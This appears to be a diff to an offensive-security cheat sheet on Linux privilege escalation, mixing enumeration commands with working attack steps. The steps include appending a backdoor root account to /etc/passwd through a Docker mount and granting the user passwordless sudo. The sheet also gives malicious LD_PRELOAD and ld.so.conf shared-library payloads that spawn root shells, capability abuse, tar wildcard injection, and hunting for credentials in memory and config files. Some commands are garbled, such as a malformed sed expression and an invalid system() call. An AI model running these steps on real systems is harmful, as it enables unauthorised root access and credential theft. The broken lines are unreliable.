@@ -47,13 +47,16 @@ For more information about that technique refer to [T1068 - Exploitation for Pri
 cat /etc/resolv.conf       # Display DNS resolver(s)
 cat /etc/sysconfig/network # Displays global network settings
 cat /etc/networks          # Displays network names
+cat /etc/squid.conf        # Displays squid proxy config
 ifconfig                   # Displays network interface
 iwconfig                   # Displays wireless network interface
 iptables -L                # List all rules of all chains
 dnsdomainname              # Displays the system's DNS domain name
 arp -e                     # Displays the ARP cache
+ip neigh                   # Displays ARP table on new system
 route                      # Displays the routing table
-netstat -antlup # Display all TCP,UDP listening and non-listening ports with their associated PID
+netstat -antlup            # Display all TCP,UDP listening and non-listening ports with their associated PID
+ss -anp                    # Dumps socket statistics and displays information
 ```
 
 Also check if tcpdump is available, you could maybe sniff some interesting things.
@@ -66,6 +69,26 @@ Netstat options:
 - **-l**: List listening ports
 - **-p**: List with PID
 
+Note that within *squid.conf*, we could find:
+
+- domain names
+- cachemgr_passwd directive, which allows you to protect cache manager pages with a password (cleartext)
+  &rarr; curl -s --user ';PASSWORD' http://IP/squid-internal-mgr/menu | grep -v "disabled"
+  &rarr; curl -s --user ';PASSWORD' http://IP/squid-internal-mgr/fqdncache
+- Addtional information about the subnet
+
+###### Binairies
+
+It may be usefull to know if the following software are availables
+
+- Compiler: gcc, g++, make
+- Programming language interpreter: pythonX, perl, php, ruby
+- Container-related: docker, lxc, rkt, kubectl
+
+```bash
+which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 2>/dev/null
+```
+
 ###### Others
 
 ```bash
@@ -74,14 +97,18 @@ printenv
 # Search for drives
 showmount -a # List both the client hostname or IP address and mounted directory in host:dir format.
 showmount -e # Show the NFS server’s export list.
-df -h
+df -h # Display file system disk space usage in a human readable format
+/bin/ # Lists information about all or the specified block devices.
 ls /dev 2>/dev/null | grep -i "sd"
 cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab 2>/dev/null
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/mtab 2>/dev/null
 lpstat -a # Displays status information about the current classes, jobs, and printers
 ls -alh /var/mail/ # Displays the contents of the mail directory
-lsof -i
+lsof -i # listing of all Internet and x.25 (HP-UX) network opened files.
+date 2>/dev/null # Date
+lscpu # CPU info
+lsmod # Display which loadable kernel modules are currently loaded. You can then use modinfo on those module
 ```
 
 ###### *If you don't know, now you know: **([fstab](https://man7.org/linux/man-pages/man5/fstab.5.html)/[mtab](https://www.unix.com/man-page/v7/5/mtab/))**
@@ -100,6 +127,7 @@ You could find some credentials, for instance when there is a CIFS Windows Share
 ##### Potential credentials
 
 ```bash
+strings /dev/mem -n8 | grep -i PASS # Searches for words greather than 8 containing PASS in memory
 ls -la ~/.*_history #
 ls -la /root/.*_history #
 cat /var/apache2/config.inc
@@ -187,6 +215,8 @@ car /etc/pure-ftpf/pure-ftpf.conf
 cat /etc/httpd/conf/httpd.conf
 cat /opt/lampp/etc/httpd.conf
 ls -aRl /etc/ | awk '$1 ~ /^.*r.*/' # Displays all configuration files.
+find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \) # Rsync files
+find /etc -name squid.conf 
 ```
 
 - **/etc/exports**: Contains configurations and permissions of which folders/file systems are exported to remote users.
@@ -404,6 +434,17 @@ lxc exec thomasd /bin/sh
 #[System]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
 
+##### Docker group
+
+###### Mount technique
+
+```bash
+# Mount the file
+docker run -it --rm -v /:/mnt bash
+# Add a backdoor account toor:password.
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
+```
+
 #### Sudo --shell
 
 The **/etc/shells** is a Linux / UNIX text file which contains the full pathnames of valid login shells.
@@ -440,33 +481,63 @@ sudo -l # Check if they are scripts than once launch, they are run as root
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 ```
 
-##### LD_PRELOAD
+#### tty_tickets,  env_reset & timestamp_timeout
 
-**LD_PRELOAD** is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
+> / / / To finish
 
-If output of a sudo -l shows +LD_PRELOAD on an entries, you can take advantage of it.
+When a user authenticates with sudo, a ticket is temporarily created that allows sudo to run without re-authentication for a short period of time.
+If a user logs out and the ticket is not cleared, the ticket is reused when the user logs back in, and the user does not need to re-authenticate.
 
-create the following payload
+If tty_tickets is disabled, the requirement for sudo users to re‑authenticate is controlled by this policy and the adclient.sudo.clear.passwd.timestamp setting in the agent configuration file.
 
-```c
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
+[env_reset]
 
-void _init() {
-unsetenv("LD_PRELOAD");
-setgid(0);
-setuid(0);
-system("/bin/bash");
-}
-```
+timestamp_timeout: Number of minutes that can elapse before sudo will ask for a passwd again.
+-> The default is 5
+Set this to 0 to always prompt for a password.
+If set to a value less than 0 the user's time stamp will not expire until the system is rebooted.
 
-Compile it, put it an a writtable directory and launch it with nano
+- Defaults env_reset
+  -> By default, the env_reset flag is enabled. This causes commands to be executed with a new, minimal environment. On AIX (and Linux systems without PAM), the environment is initialized with the contents of the /etc/environment file.
+- Defaults !env_reset
+  -> don't reset any environment variables from the invoking process, for ALL users.
 
 ```bash
-gcc -fPIC -shared -o evil.so evil.c -nostartfiles
-sudo LD_PRELOAD=evil.so nano
+sudo sed -i 'timestamp_timeout=-1/' /etc/sudoers
 ```
+
+https://github.com/7CA700B53CA3/atomic-red-team-pre-subtechniques/blob/d591d963b6e88caec70d33f388299107d05c7a73/atomics/T1206/T1206.md
+
+#### Sudo Killer (Tool)
+
+[SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER) is an automated script which searches for the following:
+
+- Misconfigurations
+- Dangerous Binaries
+- Vulnerable versions of sudo - CVEs
+- Dangerous Environment Variables
+- Credential Harvesting
+- Writable directories where scripts reside
+- Binaries that might be replaced
+- Identify missing scripts
+
+```bash
+# Online mode
+./sudo_killer.sh -c -e -r report.txt -p /tmp/report
+# Offline mode
+./extract.sh
+./sudo_killer.sh -c -i /path/sk_offline.txt
+```
+
+#### doas
+
+OpenBSD's alternative to sudo is **doas**, although it does not work the same way as sudo and requires some configuration.
+
+```bash
+cat  /etc/doas.conf
+```
+
+If you see "permit nopass", then it's command that can be run as root
 
 For more information about that technique refer to [T1574.006 - Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
 
@@ -476,14 +547,14 @@ The /etc/sudoers file controls who can run what commands as what users on what m
 
 You can use **PASSWD** and **NOPASSWD** to specify whether the user has to enter a password or not.
 
-### Timers
+### /etc/init.d & /etc/rc.local
 
-> / / / To Finish / / /
-
-Timers are systemd unit files whose name ends in . timer that control . service files or events. Timers can be used as an alternative to cron.
+THe **/etc/init.d** directory stores scripts which are started during the boot process (or executed when you shutdown or reboot the system).
+The **/etc/rc.local** script is executed after all the normal system services, within **/etc/init.d**,  are started
 
 ```bash
-systemctl list-timers --all
+# Here we restart for example the service called thomas
+/etc/init.d/thomas restart
 ```
 
 ### Cron Jobs
@@ -517,6 +588,8 @@ echo $PATH
 ```
 
 If you notice '.' in environment PATH variable it means that the logged user can execute binaries/scripts from the current directory and it can be an excellent technique for an attacker to escalate root privilege.
+
+For more information about that technique refer to [T1574.007 - Hijack Execution Flow: Path Interception by PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007/)
 
 ###### *If you don't know, now you know: [PATH](https://en.wikipedia.org/wiki/PATH_(variable))*
 
@@ -586,6 +659,20 @@ touch -- --checkpoint-action=exec=/bin/sh # Create a file named --checkpoint-act
 --checkpoint=1 --checkpoint-action=action=exec=sh shell.sh # Perform shell.sh every file it go through
 ```
 
+### Timers
+
+Timers are systemd unit files whose name ends in . timer that control . service files or events. Timers can be used as an alternative to cron.
+
+Timers are systemd unit files with a suffix of .timer. Timers are like other unit configuration files and are loaded from the same paths but include a [Timer] section which defines when and how the timer activates.
+
+```bash
+systemctl list-timers --all
+```
+
+You can abuse from timers the same way as for cron jobs.
+
+For more information about that technique refer to [T1053.006 - Scheduled Task/Job: Systemd Timers](https://attack.mitre.org/techniques/T1053/006/)
+
 ### Linux Processes
 
 [pspy](https://github.com/DominicBreuker/pspy#how-it-works) is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.
@@ -593,7 +680,7 @@ It heavily uses the [inotify API](https://man7.org/linux/man-pages/man7/inotify.
 Inotify can be used to monitor individual files, or to monitor directories.
 
 ```bash
-pspy
+./pspy64 -pf -i 1000 # Displays both commands and file system events and scan procfs every 1000 ms (=1sec)
 ps -aef --forest
 top
 cat /etc/services
@@ -601,6 +688,25 @@ ps aux | grep root # Displays services run by root
 ps -ef | grep root # Displays services run by root
 ss -lnpt # Dumps socket statistics
 ```
+
+#### Dumping memory
+
+If there are softwares that are running and may contains interesting data, it worst trying to dump the heap of it.
+
+```bash
+# If the GDB Project Debugger is installed, we try to run it against the PID we are interested in
+gdb -p PID
+# We dump the heap from the memory adresses from where the program is running
+dump memory /tmp/heap.txt 0x000000 0xF00000
+
+strings /tmp/heap.txt | grep passwd
+```
+
+Note that gdb will show also indicate you the following three sections:
+
+- [heap]:The heap of the program
+- [stack]:The stack of the main process
+- [vdso]:The "virtual dynamic shared object", the kernel system call handler
 
 ### Binaries installed
 
@@ -622,6 +728,14 @@ For instance, you can find Python or Perl that are assigned to root and you can 
 ./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
 
+If you can use **/usr/sbin/setcap** or **/usr/bin/setcap** you can easily perform privilege escalation by doing the following
+
+```bash
+/usr/bin/setcap cap_setuid+ep /mybin
+```
+
+*Note that on some systems, getcap is not available for all users* 
+
 ###### *If you don't know, now you know: [Capabilities](https://linux.die.net/man/7/capabilities)*
 
 Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as *capabilities*, which can be independently enabled and disabled. Capabilities are a per-thread attribute.
@@ -634,6 +748,8 @@ Some capabilities to look for are:
 - **CAP_SETGID**: Make arbitrary manipulations of process GIDs and supplementary GID list
 - **CAP_SETUID**: Make arbitrary manipulations of process UIDs
 - **CAP_SYS_PTRACE**: Transfer data to or from the memory of arbitrary processes
+
+Note that **=ep** is equal to ALL the capabilites permitted (p) and effective (e) from the start.
 
 ### D-Bus Enumeration
 
@@ -671,7 +787,7 @@ Within Linux, here below is the order where the O.S. searches for librairies:
 2. Any directories specified by –rpath options (directories specified by rpath options are included in the executable and used at runtime)
 3. LD_RUN_PATH
 4. LD_LIBRARY_PATH
-5. Directories in the DT_RUNPATH or DT_RPATH. (DT_RPATH entries are ignored if DT_RUNPATH entries exist
+5. Directories in the DT_RUNPATH or DT_RPATH. (DT_RPATH entries are ignored if DT_RUNPATH entries exist)
 6. /lib and /usr/lib
 7. Directories within /etc/ld.so.conf
 
@@ -682,32 +798,164 @@ Here below is a nice diagram from [contextis.com](https://www.contextis.com/en/b
 ![Dynamic Linked Shared Object Library Diagram](Linux_Privilege_Escalation_via_Dynamically_Linked_Shared_Object_Library02.png)
 
 ```bash
-# 1
+# 1. Check if the binary is looking for shared libraries that we could exploit
 ldd BINARY
-# 2
+# 2. Check if the binary has been compiled with -rpath
 objdump -x BINARY | grep RPATH
-# 3
+# 3. Display both $LD_LIBRARY_PATH and LD_RUN_PATH environment variable
 echo $LD_LIBRARY_PATH
 echo $LD_RUN_PATH
-objdump -x BINARY | grep RUNPATH
-ls
+# 4. Display the LD_RUN_PATH environment variable
+objdump -x PATH/BINARY | grep RUNPATH
+readelf -d PATH/BINARY | head -20
+chrpath -l PATH/BINARY
+# 5. Display the content for both /lib and /usr/lib
+ls /lib
+ls /usr/lib
+# 6. Display the content of /etc/ld.so.conf
+cat /etc/ld.so.conf
+# 7. Display if there are any missing libraries
+ldd BINARY | grep "not found"
 ```
 
+#### RPATH
+
+[readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) is a program for displaying various information about object files on Unix-like systems such as objdump.
+
+- **-d**: Displays the contents of the file's dynamic section, if it has one.
+
+```bash
+# Display the library RPATH
+readelf -d BIN | egrep "NEEDED|RPATH"
+ldd BIN
+# If there is one, create an evil dll and place it at the RPATH
+gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6
+```
+
+#### RUNPATH
+
+**RPATH** designates the run-time search path hard-coded in an executable file or library.
+We need also to know about **$ORIGIN** which is a special variable that indicate actual executable filename.
+
+To set a library when **-rpath** has been set during the compilation you can do the following
+
+```bash
+chrpath -r "\$\ORIGIN/PATH/thomas.so" /usr/bin/vulnerable_exe
+```
+
+If it is not possible, we try the to use [patchelf](https://github.com/NixOS/patchelf) which is a simple utility for modifying existing ELF executables and libraries
+
+```bash
+patchelf — set-rpath "$ORIGIN/PATH/thomas.so" /usr/bin/vulnerable_exe
+```
+
+#### "/lib" & "/usr/lib"
+
+#### "LD_LIBRARY_PATH & LD_RUN_PATH" Method
+
+LD_LIBRARY_PATH: Search path environment variable for the linux shared library.
+LD_PRELOAD: Influence the linkage of shared libraries and the resolution of symbols (functions) at runtime.
+LD_RUN_PATH: Tell the dynamic link loader where to search for the dynamic shared libraries an application was linked against.
+
+We can do the following:
+
+```bash
+# Either add the path where our malicious .so is
+LD_LIBRARY_PATH export LD_LIBRARY_PATH=/tmp/
+# Use LD_PRELOAD to force vulnerable_exe to use thomas.so
+LD_PRELOAD=/tmp/thomas.so /usr/bin/vulnerable_exe
+# Use LD_RUN_PATH to
+LD_RUN_PATH=/tmp/thomas.so /usr/bin/vulnerable_exe
+```
+
+#### "/etc/ld.so.conf" Method
+
+We need to check if we have write permission in **/etc/ld.so.conf(.d)**.
+
+Some existing libraries do not contain enough information to allow the deduction of their type. Therefore, the /etc/ld.so.conf file format allows the specification of an expected type.
+
+Let's add a directory where we have right access to **ld.so.conf**
+
+```bash
+sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
+```
+
+And then create a shared library that is going to get us root
+
+```c
+//gcc -shared -o thomas.so -fPIC thomas.c
+
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+void thomas(){
+    setuid(0);
+    setgid(0);
+    system("/bin/sh",NULL,NULL);
+}
+```
+
+#### LD_PRELOAD
+
+**LD_PRELOAD** is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
+
+If output of a sudo -l shows +LD_PRELOAD on an entries, you can take advantage of it.
+
+create the following payload
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+}
+```
+
+Compile it, put it an a writtable directory and launch it with nano
+
+```bash
+gcc -fPIC -shared -o evil.so evil.c -nostartfiles
+sudo LD_PRELOAD=evil.so nano
+```
+
+For more information about that technique refer to [T1574 - Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
+
+### Linux kernel drivers
+
+During implementation of Linux kernel drivers, the developer might register a device driver file which will usually be registered in the /dev/ directory.
+Operations supported by the device driver file are described in the ‘file_operations’ structure which contains a number of function pointers, one for each operation.
+
+dmesg 2>/dev/null | grep "signature"
+
+module verification failed: signature and/or required key missing - tainting kernel
+
+ mmap handler
+
+The main purpose of an mmap handler is to speed up data exchange between userland programs and kernel space.
+
+The kernel might **share a kernel buffer** or some physical range of memory directly with the **user address space**. The user space process may modify this memory directly without the need for making additional
+syscalls.
+
+![Virtual Memory](VirtualMemoryLinux.gif)
+source: <https://developer.ibm.com/technologies/linux/articles/l-kernel-memory-access/>
+
+Note that normally:
+
+- Applications are not allowed to access the kernel memory.
+- Restricted Kernel data must not leave the kernel memory.
+
 > / / / To Finish / / /  
-
-http://osr507doc.sco.com/en/tools/ShLib_WhatIs.html#:~:text=A%20shared%20library%20is%20a,Instead%2C%20a%20special%20section%20called%20.
-
-https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example
 https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#shared-library
 https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
 https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/
 
-> / / / To Do / / /  
-
-lsmod
-
-> / / / To Do / / /  
 
 #### Others
 
